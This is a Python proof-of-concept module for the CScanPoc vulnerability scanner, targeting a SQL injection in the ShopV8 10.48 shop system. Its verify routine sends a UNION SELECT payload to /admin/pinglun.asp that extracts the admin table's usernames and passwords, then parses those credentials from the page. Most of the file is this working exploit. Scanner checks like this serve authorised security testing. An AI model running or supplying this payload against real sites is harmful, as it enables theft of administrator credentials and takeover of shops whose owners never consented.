# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Shopv8_0101'  # 平台漏洞编号，留空
    name = 'ShopV8 10.48 /admin/pinglun.asp SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-02'  # 漏洞公布时间
    desc = '''
        Shopv8商城系统是一款Asp商城系统，运行环境支持ASP。
        漏洞出现在pinglun.asp文件。
    '''  # 漏洞描述
    ref = 'http://www.shellsec.com/tech/2143.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Shopv8商城系统'  # 漏洞应用名称
    product_version = '10.48'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '76f1c7f8-172a-4124-bfc2-cb90bdc2fb27'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,3,4,"
                       "username,password,7,8,9,10,11%20from%20admin")
            verify_url = self.target + payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r'.*?id=[\'"]?pingluntitle[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'
                                 r'.*?id=[\'"]?pingluncontent[\'"]?.*?>(?P<password>\w+)</textarea>',
                                 re.I | re.S)
            match = pattern.match(content)
            if match == None:
                return
            username = match.group("username")
            password = match.group("password")
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
